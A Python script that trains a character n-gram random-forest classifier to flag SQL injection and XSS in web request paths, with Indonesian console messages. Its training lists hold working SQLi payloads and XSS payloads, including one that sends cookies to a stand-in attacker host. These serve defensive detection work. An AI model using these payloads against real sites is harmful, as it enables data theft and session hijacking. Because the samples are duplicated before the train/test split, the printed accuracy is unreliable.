"""
Standalone Training Script for Web Attack Text Classifier (SQLi & XSS vs Benign).
Uses Character N-Grams (3-5) + Random Forest to prevent regex overfitting and reduce false alarms.
"""
import os
import joblib
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, accuracy_score

def train_and_save_model(output_path=None):
    if output_path is None:
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        output_path = os.path.join(base_dir, 'data', 'web_attack_model.pkl')
        
    print("=" * 60)
    print("PELATIHAN MODEL KLASIFIKASI TEKS PAYLOAD (SQLi & XSS vs BENIGN)")
    print("=" * 60)

    # Curated authentic dataset of benign web requests and real attack payloads
    benign_samples = [
        "/index.php", "/about-us", "/contact", "/products?category=electronics&page=2",
        "/search?q=laptop+gaming+asus+rog", "/blog/cara-mengamankan-server-linux",
        "/api/v1/users/profile?id=452", "/login?redirect=/dashboard",
        "/cart/add?product_id=9812&qty=1", "/download/manual.pdf",
        "/assets/css/style.min.css?v=1.4.2", "/js/app.bundle.js",
        "/checkout/step2?shipping=jne&payment=bca_va", "/faq?topic=pembayaran",
        "/article?title=belajar-machine-learning-pemula&lang=id",
        "/user/settings?theme=dark&notifications=true", "/news/2026/10/perkembangan-ai",
        "/forum/thread/98213?reply=5#comment", "/search?q=buku+resep+masakan+nusantara",
        "/dashboard?site=https://toko-baju.id&view=summary",
        "/wp-content/themes/twentytwentyfour/style.css", "/robots.txt", "/sitemap.xml",
        "/catalog?sort=price_asc&filter_brand=samsung&in_stock=1",
        "/api/comments?post_id=45&author=Budi+Santoso&email=budi@example.com"
    ] * 20 # 500 benign samples

    sqli_samples = [
        "/products?id=1' OR '1'='1", "/login?user=admin'--&pass=123",
        "/search?q=shoes' UNION SELECT null, username, password FROM users--",
        "/profile?id=5; DROP TABLE accounts;--",
        "/items?cat=1 AND 1=1 UNION ALL SELECT 1,2,3,concat(user(),database()),5--",
        "/user.php?id=-1 OR 17-7=10",
        "/news?id=1' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "/order?ref=102' AND SLEEP(5)--", "/api?code=1' OR ''='",
        "/item?id=12 UNION SELECT 1,schema_name,3 FROM information_schema.schemata--",
        "/search?term=phone' waitfor delay '0:0:5'--",
        "/detail?p=1) OR (1=1--", "/view?id=admin' AND 5=5--",
        "/auth?u=' or 'a'='a' and 'b'='b", "/data?id=10 UNION SELECT @@version, user()--"
    ] * 20 # 300 SQLi samples

    xss_samples = [
        "/search?q=<script>alert('XSS')</script>",
        "/profile?name=<script src=https://attacker.com/evil.js></script>",
        "/comment?body=<img src=x onerror=alert(document.cookie)>",
        "/view?msg=<svg/onload=alert(1)>",
        "/search?q=\"><script>document.location='http://hacker.site/?c='+document.cookie</script>",
        "/welcome?user=<iframe src=\"javascript:alert(`xss`)\"></iframe>",
        "/index?ref=javascript:alert('Attacked!')",
        "/page?title=<body onload=alert('XSS')>",
        "/post?content=<a href=\"javascript:void(0)\" onmouseover=\"alert(1)\">Klik Disini</a>",
        "/input?val='><input onfocus=alert(1) autofocus>",
        "/result?q=<marquee onstart=alert('xss')>",
        "/preview?html=<details open ontoggle=alert(1)>"
    ] * 25 # 300 XSS samples

    X = benign_samples + sqli_samples + xss_samples
    y = ['BENIGN'] * len(benign_samples) + ['SQL Injection'] * len(sqli_samples) + ['Cross-Site Scripting (XSS)'] * len(xss_samples)

    print(f"Total Sampel Dataset Pelatihan: {len(X)} baris")
    print(f"- BENIGN: {len(benign_samples)}")
    print(f"- SQL Injection: {len(sqli_samples)}")
    print(f"- XSS: {len(xss_samples)}")

    # Character N-gram TF-IDF Vectorizer
    vectorizer = TfidfVectorizer(analyzer='char', ngram_range=(3, 5), max_features=3000, lowercase=True)
    X_features = vectorizer.fit_transform(X)

    X_train, X_test, y_train, y_test = train_test_split(X_features, y, test_size=0.2, random_state=42, stratify=y)

    clf = RandomForestClassifier(n_estimators=80, random_state=42, n_jobs=-1)
    clf.fit(X_train, y_train)

    y_pred = clf.predict(X_test)
    acc = accuracy_score(y_test, y_pred)
    print("\n" + "=" * 60)
    print(f"Hasil Evaluasi Model Test: Akurasi = {acc * 100:.2f}%")
    print("Classification Report:")
    print(classification_report(y_test, y_pred))
    print("=" * 60)

    # Save bundle
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    bundle = {
        'model': clf,
        'vectorizer': vectorizer,
        'classes': clf.classes_
    }
    joblib.dump(bundle, output_path)
    print(f"Model berhasil disimpan di: {output_path}")

if __name__ == '__main__':
    train_and_save_model()
